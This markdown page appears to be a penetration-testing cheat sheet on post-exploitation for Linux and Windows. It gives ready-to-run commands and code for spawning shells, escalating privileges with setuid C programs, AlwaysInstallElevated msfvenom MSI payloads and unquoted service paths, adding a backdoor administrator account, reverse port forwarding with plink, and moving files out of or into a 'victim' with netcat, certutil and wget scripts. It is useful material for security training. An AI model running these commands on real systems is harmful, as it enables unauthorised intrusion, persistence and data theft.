---
title: Exploitation
---

[Home](./)

_Ensuring you don't have to re-exploit over and over again_

## Executing in Memory - TMPFS

```bash
mount | grep ^tmp

# Example:
# tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
#
# Beware of the "noexec" flag; executing programs will fail
```

## Get full TTY shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Switch user

```bash
su $USER
```

## Run Single command as a different user

### Linux

```bash
sudo -u $USER $cmd
```

### Windows 

```bash
echo "$PASSWORD" | runas /profile /user:$USER “$COMMAND”
```

+ [sudo.cmd](./assests/sudo.cmd) <sup><sub>[[copy&paste](assets/files/sudo.cmd.txt)]


## Windows Privilege Escalation

### windows-exploit-suggester.py

+ [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) <sup><sub>[[archive](assets/files/windows-exploit-suggester.py)]

```bash
# Victim
systeminfo # Copy & Paste this into a file on the attacker

# Attacker
python windows-exploit-suggester.py --update

python windows-exploit-suggester.py --database 20XX-YY-ZZ-mssb.xlsx --systeminfo systeminfo.txt
```

### Creating Windows Admin Account

```bash
# Victim
net user /add jack sparrow
net localgroup administrators jack /add

# Connect with
rdesktop -u jack -p sparrow [IP-ADDRESS]
```

### Setuid.c
<sup><sub>[[archive](assets/files/win_setuid.c]

If you can overwrite a binary that'll be run with priviledge, run this.

```c
#include <stdlib.h>
int main()
{
    int i;
    i = system("net localgroup administrators theusername /add");
    return 0;
}
```

### Windows Service / DLL Templates

+ [windows_dll.c](https://github.com/sagishahar/scripts/blob/master/windows_dll.c) <sup><sub>[[archive](assets/files/windows_dll.c)]

+ [windows_service.c](https://github.com/sagishahar/scripts/blob/master/windows_service.c) <sup><sub>[[archive](assets/files/windows_service.c)]

#### Cross-compiling for Windows

##### C & C++

```bash
# Setup
apt install mingw-w64

# x86
x86_64-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
```

##### C#

```bash
# Setup 
# Add repo with https://www.mono-project.com/download/stable/
sudo apt-get install mono-complete msbuild mono-roslyn

# Building
msbuild [src.sln]
```

#### Using Python Scripts without Python installed
[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](assets/files/PyInstaller-3.6.zip)]
```bash
pyinstaller yourprogram.py
```

### Always Install Elevated
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# If both of these are 0x1 - you can install msi packages as system.
# Generate MSI Payload with:
msfvenom [blah blah blah] -f msi -o setup.msi

# Execute it with:
msiexec /quiet /qn /i setup.msi
```

### Unquoted Paths

When windows sees the a service is pointed to `C:\Program Files\Something Here\service.exe` (**without quotes around it**), it will try to run the following in order:

```bash
C:\Program.exe
C:\Program Files\Something.exe
C:\Program Files\Something Here\service.exe
```

If you make sure one of these exists before the legitimate is called, you can get code execution.

### Attacking From The Inside

Some services can only be accessed from inside the victim itself. List all active network connections with:

```bash
netstat -ano
```

Then port forward to them using reverse ssh proxy.

+ [Putty](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
+ [Plink](https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe) <sup><sub>[[archive (32-bit)](assets/files/plink.exe)]

```bash
plink.exe -l $LUSER -pw $LPASS $LHOST -R $LPORT:127.0.0.1:$RPORT
# L == Attacker
# R == Victim
```

### Vulnerable Scheduled Tasks
```bash
# Victim
schtasks /query /fo LIST /v > schtask.txt

# Attacker
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

## Linux Privilege Escalation

### Setuid.c
<sup><sub>[[archive](assets/files/lin_setuid.c]

If you can overwrite a binary that'll be run with priviledge, run this.

```c
int main(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", 0);
}
```

### Setuid.c

## Exfiltration

+ SSH Copy (scp)

```bash
scp user@hostname:/path/to/src user@hostname:/path/to/dst
```

+ Netcat

```bash
# Victim
nc -nvlp $RPORT > out.file

# Attacker
nc -nv $RHOST $RPORT < in.file
```

+ exe2bat

```bash
# Convert a windows executable to a copy and paste set of commands
wine $(locate exe2bat.exe) nc.exe nc.txt
```

+ certutil.exe

```bash
certutil.exe -urlcache -split -f “$URL” $FILENAME
```

+ [zip.vbs](assets/files/zip.vbs) <sup><sub>[[copy&paste](assets/files/zip.vbs.txt)]

```bash
CScript zip.vbs $SRC $DEST
```

+ [wget.vbs](assets/files/wget.vbs) <sup><sub>[[copy&paste](assets/files/wget.vbs.txt)]

```bash
CScript wget.vbs $SRC $DEST
```

## Fun Tips

### Linux Write a file without a text editor

```bash
cat <<EOF> [file]
```